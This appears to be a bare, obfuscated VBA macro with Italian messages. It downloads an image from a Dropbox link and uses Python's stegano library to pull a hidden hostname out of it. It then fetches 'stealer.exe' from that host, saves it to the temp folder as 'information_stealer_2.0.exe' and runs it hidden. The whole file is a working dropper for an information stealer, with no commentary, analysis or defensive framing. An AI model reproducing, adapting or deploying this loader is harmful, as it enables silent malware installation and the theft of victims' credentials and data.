Sub naa7ec72462519e9f922940dbe20d0f99()
Dim b8cfabdee56b2161699e6a339115ada16 As String
Dim bcfa4bd089178f9e807cfab26a27b80fe As String
Dim v6a1e4ed909bb5beb3b26a1e49df1e07b As String
Dim wd6b3075a81e24cf235150cd569c701e5 As String
Dim wbaf5c750e8517ac3b6d18e9a10716b76 As Object
Dim z5917c3933a38f8877194806e781ae47e As Object
imageUrl = "https://www.dropbox.com/scl/fi/o4xfhypsewuvz85xxd0vw/encoded_image.png?rlkey=bywjtcwbicceonn67yx69mxrf&st=kod29s2a&raw=1"
wd6b3075a81e24cf235150cd569c701e5 = "C:\Users\rocco\AppData\Local\Temp\encoded_image.png"
If Not c58fab3c2319f1d47a8fbd23ac9739f5a(imageUrl, wd6b3075a81e24cf235150cd569c701e5) Then
MsgBox "Errore nel download dell'immagine!"
Exit Sub
End If
b8cfabdee56b2161699e6a339115ada16 = b1c2236ec9fc6ff0d77c9aba35e249eab(wd6b3075a81e24cf235150cd569c701e5)
bcfa4bd089178f9e807cfab26a27b80fe = "http://" & b8cfabdee56b2161699e6a339115ada16 & "/stealer.exe"
bcfa4bd089178f9e807cfab26a27b80fe = Replace(bcfa4bd089178f9e807cfab26a27b80fe, vbCrLf, "")
bcfa4bd089178f9e807cfab26a27b80fe = Replace(bcfa4bd089178f9e807cfab26a27b80fe, vbCr, "")
bcfa4bd089178f9e807cfab26a27b80fe = Replace(bcfa4bd089178f9e807cfab26a27b80fe, vbLf, "")
v6a1e4ed909bb5beb3b26a1e49df1e07b = Environ("TEMP") & "\information_stealer_2.0.exe"
With CreateObject("MSXML2.XMLHTTP")
.Open "GET", bcfa4bd089178f9e807cfab26a27b80fe, False
.Send
If .Status = 200 Then
Set z5917c3933a38f8877194806e781ae47e = CreateObject("ADODB.Stream")
z5917c3933a38f8877194806e781ae47e.Open
z5917c3933a38f8877194806e781ae47e.Type = 1
z5917c3933a38f8877194806e781ae47e.Write .ResponseBody
z5917c3933a38f8877194806e781ae47e.SaveToFile v6a1e4ed909bb5beb3b26a1e49df1e07b, 2
z5917c3933a38f8877194806e781ae47e.Close
End If
End With
Shell v6a1e4ed909bb5beb3b26a1e49df1e07b, vbHide
End Sub
Function c58fab3c2319f1d47a8fbd23ac9739f5a(ByVal fileUrl As String, ByVal localPath As String) As Boolean
On Error GoTo ErrHandler
Dim bb81576eb0876ae0d0c33d751dae39de3 As Object
Dim xfc5d43b8304fa915bdf038e967c4d02a As Object
Set bb81576eb0876ae0d0c33d751dae39de3 = CreateObject("WinHttp.WinHttpRequest.5.1")
bb81576eb0876ae0d0c33d751dae39de3.Open "GET", fileUrl, False
bb81576eb0876ae0d0c33d751dae39de3.Send
If bb81576eb0876ae0d0c33d751dae39de3.Status = 200 Then
Set xfc5d43b8304fa915bdf038e967c4d02a = CreateObject("ADODB.Stream")
xfc5d43b8304fa915bdf038e967c4d02a.Open
xfc5d43b8304fa915bdf038e967c4d02a.Type = 1
xfc5d43b8304fa915bdf038e967c4d02a.Write bb81576eb0876ae0d0c33d751dae39de3.ResponseBody
xfc5d43b8304fa915bdf038e967c4d02a.SaveToFile localPath, 2
xfc5d43b8304fa915bdf038e967c4d02a.Close
c58fab3c2319f1d47a8fbd23ac9739f5a = True
Else
c58fab3c2319f1d47a8fbd23ac9739f5a = False
End If
Exit Function
ErrHandler:
c58fab3c2319f1d47a8fbd23ac9739f5a = False
End Function
Function b1c2236ec9fc6ff0d77c9aba35e249eab(wd6b3075a81e24cf235150cd569c701e5 As String) As String
Dim z4f67129270f273dbc2e11b76b3090f3d As String
Dim xb37068bde82d378f8efaa9ce9a4dbe4b As String
Dim x050bf5bdc674ddbce4e9105affbd7412 As String
Dim tb6811188f901b4fd53bb31370d638292 As String
Dim wa9a4c857c7a137503cb09c5f6caf88ba As Object
Dim r19e95074a4a717edf055f42e9e1930fa As Object
z4f67129270f273dbc2e11b76b3090f3d = "C:\Users\rocco\AppData\Local\Programs\Python\Python39\python.exe"
wd6b3075a81e24cf235150cd569c701e5 = Replace(wd6b3075a81e24cf235150cd569c701e5, "\", "\\")
xb37068bde82d378f8efaa9ce9a4dbe4b = """" & z4f67129270f273dbc2e11b76b3090f3d & """ -c ""from stegano import lsb; print(lsb.reveal('""" & wd6b3075a81e24cf235150cd569c701e5 & """'))"""
If Dir(z4f67129270f273dbc2e11b76b3090f3d) = "" Then
Exit Function
End If
If Dir(wd6b3075a81e24cf235150cd569c701e5) = "" Then
Exit Function
End If
Set wa9a4c857c7a137503cb09c5f6caf88ba = VBA.CreateObject("WScript.Shell")
Set r19e95074a4a717edf055f42e9e1930fa = wa9a4c857c7a137503cb09c5f6caf88ba.Exec(xb37068bde82d378f8efaa9ce9a4dbe4b)
tb6811188f901b4fd53bb31370d638292 = r19e95074a4a717edf055f42e9e1930fa.StdOut.ReadAll
If tb6811188f901b4fd53bb31370d638292 <> "" Then
x050bf5bdc674ddbce4e9105affbd7412 = tb6811188f901b4fd53bb31370d638292
End If
b1c2236ec9fc6ff0d77c9aba35e249eab = Trim(x050bf5bdc674ddbce4e9105affbd7412)
End Function